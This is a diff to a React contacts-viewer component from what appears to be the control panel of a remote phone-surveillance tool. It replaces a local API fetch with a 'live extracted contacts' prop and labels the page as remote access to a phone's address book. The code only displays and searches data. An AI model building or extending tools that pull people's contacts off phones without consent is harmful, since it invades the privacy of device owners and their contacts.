@@ -1,31 +1,28 @@
 import React, { useState, useEffect } from 'react';
-import axios from 'axios';
 import { MOCK_CONTACTS } from '../mockData';
 
-function ContactsViewer({ token, activeDevice }) {
+function ContactsViewer({ token, activeDevice, liveContacts }) {
   const [contacts, setContacts] = useState(MOCK_CONTACTS);
   const [search, setSearch] = useState('');
 
   useEffect(() => {
-    if (activeDevice) {
-      axios
-        .get(`http://localhost:5000/api/contacts/${activeDevice._id}`, {
-          headers: { authorization: token }
-        })
-        .then((res) => {
-          if (res.data && res.data.length > 0) {
-            setContacts(res.data);
-          }
-        })
-        .catch(() => {});
+    if (liveContacts && liveContacts.length > 0) {
+      const formatted = liveContacts.map((c, idx) => ({
+        _id: `c_${idx}`,
+        name: c.name || 'Contact',
+        phone: c.phone || '',
+        email: c.email || 'No email',
+        starred: false
+      }));
+      setContacts(formatted);
     }
-  }, [activeDevice]);
+  }, [liveContacts]);
 
   const filtered = contacts.filter(
     (c) =>
       c.name.toLowerCase().includes(search.toLowerCase()) ||
       c.phone.includes(search) ||
-      c.email.toLowerCase().includes(search.toLowerCase())
+      (c.email && c.email.toLowerCase().includes(search.toLowerCase()))
   );
 
   return (
@@ -39,14 +36,21 @@ function ContactsViewer({ token, activeDevice }) {
             Remotely access saved phone address book contacts and emails.
           </p>
         </div>
-        <div style={{ width: '280px' }}>
-          <input
-            type="text"
-            className="form-control"
-            placeholder="Search contact name or phone..."
-            value={search}
-            onChange={(e) => setSearch(e.target.value)}
-          />
+        <div style={{ display: 'flex', gap: '1rem', alignItems: 'center' }}>
+          {liveContacts && liveContacts.length > 0 && (
+            <span className="badge badge-online">
+              🟢 Live Extracted Contacts ({liveContacts.length})
+            </span>
+          )}
+          <div style={{ width: '280px' }}>
+            <input
+              type="text"
+              className="form-control"
+              placeholder="Search contact name or phone..."
+              value={search}
+              onChange={(e) => setSearch(e.target.value)}
+            />
+          </div>
         </div>
       </div>
 
@@ -67,7 +71,7 @@ function ContactsViewer({ token, activeDevice }) {
                 fontWeight: 700
               }}
             >
-              {contact.initial || contact.name.charAt(0)}
+              {contact.initial || (contact.name ? contact.name.charAt(0) : 'C')}
             </div>
 
             <div style={{ flex: 1, minWidth: 0 }}>
